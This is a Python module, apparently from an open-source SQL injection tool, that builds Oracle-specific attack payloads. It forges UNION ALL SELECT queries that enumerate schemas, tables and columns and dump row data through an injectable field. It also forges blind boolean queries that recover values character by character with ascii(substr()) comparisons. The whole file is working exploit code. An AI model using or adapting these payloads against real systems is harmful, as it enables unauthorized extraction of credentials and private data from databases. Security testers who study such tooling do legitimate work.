#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from dbmsmoles import DbmsMole, FingerBase
import re

class OracleMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.chr_join(out_delimiter_result)
    inner_delimiter_result = "><"
    inner_delimiter = DbmsMole.chr_join(inner_delimiter_result)
    
    def _schemas_query_info(self):
        return {
            'table' : '(select distinct(owner) as t from all_tables)',
            'field' : 't'
        }
    
    def _tables_query_info(self, db):
        return {
            'table' : 'all_tables',
            'field' : 'table_name',
            'filter': "owner = '{db}'".format(db=db)
        }
        
    def _columns_query_info(self, db, table):
        return {
            'table' : 'all_tab_columns ',
            'field' : 'column_name',
            'filter': "owner = '{db}' and table_name = '{table}'".format(db=db, table=table)
        }
    
    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : db + '.' + table,
            'field' : ','.join(fields),
            'filter': where
        }
    
    def _dbinfo_query_info(self):
        return {
            'field' : 'user,banner,ora_database_name', 
            'table' : 'v$version'
        }
    
    @classmethod
    def dbms_name(cls):
        return 'Oracle'
    
    @classmethod
    def dbms_check_blind_query(cls):
        return ' and 0 < (select cast(length(user) as varchar2(100)) from dual)'

    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        output = []
        for i in range(query_columns):
            hashes = list(map(lambda x: 'null', range(query_columns)))
            to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
            to_search[i] = str(base + i)
            hashes[i] = '(cast (' + str(base + i) + ' as varchar2(150)))'
            output.append(FingerBase(hashes, to_search))
        return output

    @classmethod
    def field_finger_query(cls, columns, finger, injectable_field):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(finger._query)
        query_list[injectable_field] = '(user||' + DbmsMole.chr_join(DbmsMole.field_finger_str) + ')'
        query += ",".join(query_list) + ' from dual'
        return query
        
    @classmethod
    def field_finger_trailer(cls):
        return ' from dual'

    def set_good_finger(self, finger):
        self.query = finger._query

    def to_string(self, data):
        return DbmsMole.chr_join(data)

    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(self.query)
        if re.search('count\([\w*]+\)', fields):
            query_list[injectable_field] = OracleMole.out_delimiter + '||cast(count(*) as varchar2(150))||' + OracleMole.out_delimiter
            query += ','.join(query_list)
            query += ' from ' + table_name + ' where ' + self.parse_condition(where)
            return query
        fields_splitted = fields.split(',')
        query_list[injectable_field] = ("(" +
                                            OracleMole.out_delimiter +
                                            "||(" +
                                                ('||'+OracleMole.inner_delimiter+'||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields_splitted)) +
                                            ")||" +
                                            OracleMole.out_delimiter +
                                        ")")
        query += ','.join(query_list)
        query += " from (select rownum r, " + fields + ' from ' + table_name + " where " + self.parse_condition(where) + ')'
        query += " where r = " + str(offset + 1)
        return query
    
    def blind_field_delimiter(self):
        return OracleMole.inner_delimiter_result
    
    def _concat_fields(self, fields):
        return fields
        #return ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar(150)),CHR(32))', fields))
    
    def _do_concat_fields(self, fields):
        return ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar(150)),CHR(32))', fields))
    
    def parse_results(self, url_data):
        data_list = url_data.split(OracleMole.out_delimiter_result)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(OracleMole.inner_delimiter_result)
    
    def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
        return ' and {op_par}' + str(value) + ' < (select ascii(substr('+self._do_concat_fields(fields)+', '+str(index)+', 1)) from (select rownum r,'+','.join(fields)+' from '+table+' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'
        
    def forge_blind_count_query(self, operator, value, table, where="1=1"):
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*)  from '+table+' where '+self.parse_condition(where)+')'

    def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length('+self._do_concat_fields(fields)+') from (select rownum r,'+','.join(fields)+' from '+table+' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'
